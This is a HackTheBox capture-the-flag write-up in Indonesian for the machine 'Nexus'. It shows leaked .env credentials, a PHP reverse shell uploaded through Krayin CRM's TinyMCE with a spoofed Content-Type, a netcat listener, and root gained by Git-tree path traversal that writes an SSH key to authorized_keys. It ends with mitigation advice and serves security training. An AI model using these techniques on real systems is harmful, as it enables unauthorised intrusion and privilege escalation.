# HackTheBox - Nexus Write-up

  ## Ringkasan

  Target `nexus.htb` menjalankan website utama Nexus Energy Authority. Dari enumerasi virtual host ditemukan subdomain
  `git.nexus.htb` dan `billing.nexus.htb`. Repository publik di Gitea membocorkan konfigurasi aplikasi Krayin CRM,
  termasuk database credential dan `APP_KEY`. Credential tersebut digunakan untuk login ke aplikasi billing.

  Akses awal diperoleh melalui upload PHP reverse shell pada fitur upload TinyMCE di Krayin CRM. Shell berjalan sebagai
  `www-data`. Dari sana ditemukan file environment aplikasi, lalu dilakukan pivot ke user `jones`.

  Privilege escalation dilakukan dengan menyalahgunakan service `gitea-template-sync`, yang melakukan sinkronisasi
  repository template. Dengan membuat Git tree berisi path traversal `../../../../root/.ssh/authorized_keys`, public key
  attacker berhasil ditulis ke `/root/.ssh/authorized_keys`. Setelah itu SSH sebagai root berhasil dilakukan dan
  `root.txt` didapatkan.

  ## Informasi Target

  - Machine: Nexus
  - Domain utama: `nexus.htb`
  - Subdomain penting:
    - `git.nexus.htb`
    - `billing.nexus.htb`
  - OS: Ubuntu 24.04.4 LTS
  - Web stack:
    - Nginx
    - Gitea 1.26.0
    - Krayin CRM

  ## Enumerasi

  Website utama ditemukan pada:

  ```text
  http://nexus.htb

  Pada halaman careers terdapat alamat email internal:

  j.matthew@nexus.htb

  Enumerasi virtual host dilakukan dengan ffuf:

  ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
    -u http://nexus.htb/ \
    -H "Host: FUZZ.nexus.htb" \
    -fw 4

  Hasil penting:

  git       [Status: 200]
  billing   [Status: 302]

  Kemudian host ditambahkan ke /etc/hosts di Kali:

  10.129.84.131 nexus.htb git.nexus.htb billing.nexus.htb

  ## Gitea Enumeration

  Pada git.nexus.htb, ditemukan repository publik:

  admin/krayin-docker-setup

  Repository tersebut berisi file .env. Dari commit diff terlihat konfigurasi penting:

  APP_URL=http://billing.nexus.htb
  APP_DEBUG=true

  DB_CONNECTION=mysql
  DB_HOST=127.0.0.1
  DB_PORT=3306
  DB_DATABASE=krayin
  DB_USERNAME=krayin
  DB_PASSWORD=y27xb3ha!!74GbR

  Credential ini kemudian digunakan untuk akses ke aplikasi billing.

  ## Initial Access

  Aplikasi billing berjalan di:

  http://billing.nexus.htb

  Setelah login ke dashboard Krayin CRM, fitur upload TinyMCE dapat digunakan untuk mengunggah file PHP.

  Request upload dimodifikasi melalui Burp Suite:

  Content-Disposition: form-data; name="file"; filename="php.reverse.shell.php"
  Content-Type: image/png

  Isi file adalah PHP reverse shell. Server mengembalikan path upload:

  /storage/tinymce/<random>.php

  Listener disiapkan di Kali:

  nc -lvnp 443

  Setelah file PHP diakses melalui browser, shell berhasil masuk:

  uid=33(www-data) gid=33(www-data) groups=33(www-data)

  Shell kemudian distabilkan:

  python3 -c 'import pty; pty.spawn("/bin/bash")'

  ## Post Exploitation

  Dari shell www-data, file konfigurasi aplikasi ditemukan di direktori Krayin:

  cat .env

  Isi penting:

  APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
  APP_DEBUG=true
  APP_URL=http://billing.nexus.htb

  DB_CONNECTION=mysql
  DB_HOST=127.0.0.1
  DB_PORT=3306
  DB_DATABASE=krayin
  DB_USERNAME=krayin
  DB_PASSWORD=y27xb3ha!!74GbR

  Enumerasi user lokal:

  cat /etc/passwd

  User menarik:

  jones:x:1000:1000:/home/jones:/bin/bash
  git:x:111:112:Git Version Control:/home/git:/bin/bash

  Akses sebagai jones kemudian diperoleh menggunakan credential yang ditemukan.

  User flag berada di:

  /home/jones/user.txt

  ## Privilege Escalation

  Enumerasi timer systemd menunjukkan service menarik:

  systemctl list-timers

  Ditemukan:

  gitea-template-sync.timer -> gitea-template-sync.service

  Service ini melakukan sinkronisasi repository template dari Gitea. Repository target dibuat sebagai template
  repository:

  jones/rce

  Karena mesin target tidak memiliki mapping DNS untuk git.nexus.htb, Git dipaksa menggunakan host header/resolve lokal
  saat clone atau push:

  git -c http.extraHeader="Host:git.nexus.htb" \
    clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1/jones/rce.git

  Public/private key dibuat:

  ssh-keygen -t ed25519 -f /tmp/.k -N ''

  Kemudian dibuat Git object berisi path traversal menuju:

  ../../../../root/.ssh/authorized_keys

  Tujuannya adalah agar service sync menulis public key attacker ke file authorized keys milik root.

  Script build.py dijalankan dari dalam repository Git:

  cd /tmp/rce
  python3 /tmp/build.py

  Setelah berhasil, commit object dibuat:

  Done: f0f50f4880b6bab00bee0cbda19d16933c258bc4

  Repository kemudian dipush:

  git remote set-url origin 'http://jones:y27xb3ha%21%2174GbR@git.nexus.htb/jones/rce.git'

  git -c http.curloptResolve=git.nexus.htb:80:127.0.0.1 \
    push -u origin main --force

  Push berhasil:

  [new branch] main -> main
  branch 'main' set up to track 'origin/main'

  Setelah timer berjalan, public key berhasil ditulis ke /root/.ssh/authorized_keys.

  ## Root Access

  SSH sebagai root dilakukan menggunakan private key yang dibuat sebelumnya:

  ssh -i /tmp/.k root@10.129.84.131

  Login berhasil:

  Welcome to Ubuntu 24.04.4 LTS
  root@nexus:~#

  Root flag dibaca dari:

  cat /root/root.txt

  ## Rantai Eksploitasi

  Virtual host enumeration
  -> git.nexus.htb ditemukan
  -> repository admin/krayin-docker-setup membocorkan .env
  -> credential digunakan login ke billing.nexus.htb
  -> upload PHP reverse shell via TinyMCE
  -> shell sebagai www-data
  -> enumerasi local user dan konfigurasi
  -> akses sebagai jones
  -> abuse gitea-template-sync path traversal
  -> tulis SSH public key ke /root/.ssh/authorized_keys
  -> SSH sebagai root
  -> root.txt

  ## Dampak

  - Credential sensitif tersimpan di repository publik.
  - File upload pada aplikasi billing mengizinkan eksekusi PHP.
  - Service template sync tidak memvalidasi path traversal pada Git tree.
  - Kombinasi celah ini memungkinkan remote attacker mendapatkan akses root.

  ## Rekomendasi Mitigasi

  1. Jangan menyimpan .env, credential database, atau secret aplikasi di repository.
  2. Rotasi seluruh credential yang pernah bocor.
  3. Batasi upload file hanya ke tipe aman dan simpan di lokasi non-executable.
  4. Nonaktifkan eksekusi PHP di direktori upload.
  5. Validasi dan normalisasi path pada proses sinkronisasi template.
  6. Jalankan service sync dengan user non-root dan permission minimum.
  7. Tambahkan proteksi terhadap Git tree traversal seperti .. dan absolute path.
